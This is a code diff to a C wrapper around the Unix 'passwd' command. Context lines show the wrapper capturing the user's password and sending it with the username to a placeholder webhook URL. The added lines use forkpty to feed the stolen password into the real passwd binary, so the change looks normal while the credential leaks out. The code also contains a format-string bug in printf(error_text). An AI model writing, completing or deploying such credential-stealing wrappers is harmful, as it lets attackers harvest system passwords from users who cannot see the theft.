@@ -8,6 +8,7 @@
 #include <termios.h>
 #include <sys/wait.h>
 #include <pwd.h> // For getpwnam()
+#include <pty.h> // For forkpty
 
 #define WEBHOOK_URL "YOUR_WEBHOOK_URL"
 
@@ -130,21 +131,48 @@ int main(int argc, char *argv[]) {
 
     send_webhook(username, operation, intercept_password ? password : NULL);
 
-    pid_t pid = fork();
-    if (pid == 0) {
-        if (strcmp(operation, "change_password") == 0) {
-            freopen("/dev/null", "w", stdout);
-            freopen("/dev/null", "w", stderr);
+    if (strcmp(operation, "change_password") != 0) {     
+        pid_t pid = fork();
+        if (pid == 0) {
+            execv(real_passwd_path, argv);
+            perror("execv");
+            exit(EXIT_FAILURE);
+        } else if (pid > 0) {
+            int status;
+            waitpid(pid, &status, 0);
+        } else {
+            perror("fork");
+            exit(EXIT_FAILURE);
         }
-        execv(real_passwd_path, argv);
-        perror("execv");
-        exit(EXIT_FAILURE);
-    } else if (pid > 0) {
-        int status;
-        waitpid(pid, &status, 0);
     } else {
-        perror("fork");
-        exit(EXIT_FAILURE);
+        pid_t pid;
+        int master_fd;
+        if ((pid = forkpty(&master_fd, NULL, NULL, NULL)) == 0) {
+            if (strcmp(operation, "change_password") == 0) {
+                freopen("/dev/null", "w", stdout);
+                freopen("/dev/null", "w", stderr);
+            }
+            execv(real_passwd_path, argv);
+            perror("execv");
+            exit(EXIT_FAILURE);
+        } else if (pid > 0) {
+            // Parent process: send the password to the child process
+            if (intercept_password) {
+                dprintf(master_fd, "%s\n%s\n", password, password);
+            }
+    
+            int status;
+            waitpid(pid, &status, 0);
+            if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
+                char error_text[256];
+                strerror_r(WEXITSTATUS(status), error_text, sizeof(error_text));
+                printf(error_text);
+            }
+            close(master_fd);
+        } else {
+            perror("fork");
+            exit(EXIT_FAILURE);
+        }
     }
 
     return 0;
